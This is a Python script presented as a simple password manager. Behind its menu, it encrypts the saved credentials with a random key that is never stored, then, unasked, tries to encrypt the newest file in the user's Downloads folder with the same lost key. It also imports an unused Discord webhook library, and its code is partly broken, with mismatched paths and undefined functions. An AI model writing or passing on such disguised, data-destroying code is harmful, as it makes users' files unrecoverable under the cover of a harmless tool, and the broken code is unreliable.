from discord_webhook import DiscordWebhook, DiscordEmbed
from cryptography.fernet import Fernet
from colorama import Fore
import random
import time
import sys
import os

print(Fore.RED + """                                   
                                                    
                                                    WARNING:        
          
                        Do not use this password manager, it is highly exploitable and editable.
                                        Made by: salomao31(my discord)
          
    """)

time.sleep(5)
print("Loading...")
time.sleep(2)
os.system("cls")
username = os.environ.get("USERNAME")

files = os.listdir(r"C:\\users\\salom\\Downloads")

files_sorted = sorted(files, key=lambda x: os.path.getctime(os.path.join(fr"C:\\users\\{username}\\Downloads", x)), reverse=True)

key = Fernet.generate_key()
cipher_suite = Fernet(key)

numb_gen = random.randint(0, 2000)

def encryption(file_name):
    global cipher_suite  # Ensure the global variable is used

    with open(file_name, "rb") as file_object:
        file_content = file_object.read()

    encrypted_content = cipher_suite.encrypt(file_content)

    with open(file_name, "wb") as file_object:
        file_object.write(encrypted_content)

    print(f"File {file_name} encrypted successfully.")



def saving_to_file(email, password):
    with open(f"ANX{numb_gen}.txt", "w") as file:
        file.write(f"{email}\n")
        file.write(f"{password}\n")

def email_check():

    global email

    email = input("Email: ")

    partes = email.split("@")

    if len(partes) != 2:
        print("Invalid Email, try again!")
        time.sleep(3)
        os.system("cls")
        Profile_Creation()
    elif len(partes[0]) < 1 or len(partes[1]) < 1:
        print("Invalid Email, try again!")
        time.sleep(3)
        os.system("cls")
        Profile_Creation()
    else:
        print("Valid Email, storing it...")
        time.sleep(2)
        os.system("cls")

def Profile_Creation():
    email_check()
    time.sleep(2)
    Y = input("Website Password: ")
    time.sleep(2)
    file_name = f"ANX{numb_gen}.txt"
    saving_to_file(email, Y)
    print("Successfully saved!")
    encryption(file_name)  # Pass the file name to encryption function
    print("File encrypted Successfully")
    # ... (the rest of your code)

    if files_sorted:

        recent_file = files_sorted[0]
        encryption(recent_file)  
        print("Successfully encrypted!")
    else:
        print("No files found in the directory.")

def choice_assist():

    if X1 == 1:
        Profile_Creation()
    elif X1 == 2:
        Profile_Deletion()
    elif X1 == 3:
        Passwords()
    else: 
        print("Uh oh that doesnt seem right, try again i guess? :( ")
        time.sleep(2)
        os.system("cls")
        start()


def start():
    global X1

    while True:
        print(f"""
            Welcome to my password manager {username} :)
            [1] - Add Profile
            [2] - Delete Profile
            [3] - See Passwords
            [4] - Help
        """)

        try:
            X1 = int(input(" "))
            choice_assist()
            break
        except ValueError:
            print("You need to enter a number, not a letter.")
            time.sleep(2)
            os.system("cls")
            continue

start()
os.system("cls")
